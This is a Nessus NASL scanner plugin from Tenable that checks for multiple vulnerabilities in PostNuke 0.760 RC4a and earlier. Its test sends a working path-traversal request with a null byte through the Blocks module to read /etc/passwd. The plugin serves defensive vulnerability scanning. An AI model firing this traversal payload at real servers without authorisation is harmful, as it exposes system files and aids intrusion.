#
# (C) Tenable Network Security
#


if (description) {
  script_id(18360);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-1621", "CVE-2005-1697", "CVE-2005-1698", "CVE-2005-1699", "CVE-2005-1700");
  script_bugtraq_id(13706, 13789);

  script_name(english:"Multiple Vulnerabilities in PostNuke <= 0.760 RC4a");
  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is prone to several
attacks. 

Description :

The remote host is running PostNuke version 0.760 RC4a or older. 
These versions suffer from several vulnerabilities, among them :

  - Multiple Remote Code Injection Vulnerabilities
    An attacker can read arbitrary files on the remote and 
    possibly inject arbitrary PHP code remotely.

  - SQL Injection Vulnerabilities
    Weaknesses in the 'Xanthia' and 'Messages' modules allow 
    attackers to affect database queries, possibly resulting
    in the disclosure of sensitive information such as user
    passwords and even execution of arbitrary PHP code on
    the remote host.

  - Multiple Cross-Site Scripting Vulnerabilities
    An attacker can inject arbitrary script code into the
    browser of users leading to disclosure of session 
    cookies, redirection to other sites, etc.

  - Multiple Path Disclosure Vulnerabilities
    An attacker can discover details about the underlying
    installation directory structure by calling various
    include scripts directly.

See also : 

http://archives.neohapsis.com/archives/bugtraq/2005-05/0197.html
http://archives.neohapsis.com/archives/bugtraq/2005-05/0254.html
http://archives.neohapsis.com/archives/bugtraq/2005-05/0255.html
http://archives.neohapsis.com/archives/bugtraq/2005-05/0256.html
http://community.postnuke.com/Article2691.htm

Solution : 

Apply the security fix package referenced in the article above to
upgrade to PostNuke version 0.750.0b. 

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);

  script_summary(english:"Detects multiple vulnerabilities in PostNuke <= 0.760 RC4a");

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("postnuke_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port))exit(0);
if (!can_host_php(port:port))exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/postnuke"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to grab /etc/passwd.
  req = http_get(
        item:string(
        dir, "/index.php?",
        "module=Blocks&",
        "type=lang&",
        "func=../../../../../../../../../../../../etc/passwd%00"
      ),
      port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # It's a problem if there's an entry for root.
  if (egrep(string:res, pattern:"root:.+:0:")) {
    security_hole(port);
    exit(0);
  }
}
